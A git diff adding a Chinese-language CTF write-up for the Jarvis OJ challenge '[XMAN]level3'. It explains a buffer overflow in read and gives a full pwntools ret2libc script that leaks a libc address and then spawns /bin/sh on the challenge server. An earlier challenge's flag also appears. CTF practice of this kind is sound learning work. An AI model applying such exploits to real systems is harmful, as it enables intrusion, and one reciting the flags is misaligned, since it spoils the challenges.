@@ -356,3 +356,50 @@
    ![19](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/19.png)
 
   `CTF{1759d0cbd854c54ffa886cd9df3a3d52}`
+
+  
+
+* ####  [XMAN]level3
+
+   ![21](C:\Users\wdbbw\Desktop\21.png)
+
+  开了NX，给出libc，考虑ret2libc
+
+  ![22](C:\Users\wdbbw\Desktop\22.png)
+
+  read处存在溢出
+
+  两次溢出，第一次溢出调用write，打印出一个函数的真实地址，通过这个地址和该函数在libc中的偏移地址计算libc基址，最终得到system的真实地址，第二次溢出执行system("/bin/sh")
+
+  ```python
+  # encoding:utf-8
+  from pwn import *
+  
+  r = remote("pwn2.jarvisoj.com",9879)
+  elf = ELF("./level3")
+  libc = ELF("./libc-2.19.so")
+  write_plt = elf.plt["write"]
+  libc_start_got = elf.got['__libc_start_main']
+  func = elf.symbols["vulnerable_function"]
+  system_libc = libc.symbols["system"]
+  binsh_libc = libc.search("/bin/sh").next()
+  libc_start_libc = libc.symbols["__libc_start_main"]
+  padding = 'a' * (0x88 + 0x4)
+  payload1 = padding + p32(write_plt) + p32(func) + p32(1)+p32(libc_start_got)+p32(4) 
+  r.recvuntil("Input:\n")
+  r.sendline(payload1)
+  
+  leak_addr = u32(r.recv(4))
+  libc_base = leak_addr - libc_start_libc
+  system_addr = libc_base + system_libc
+  binsh_addr = libc_base + binsh_libc
+  
+  payload2 = padding + p32(system_addr) + p32(func) + p32(binsh_addr)
+  r.recvuntil("Input:\n")
+  r.sendline(payload2)
+  r.interactive()
+  ```
+
+  
+
+  
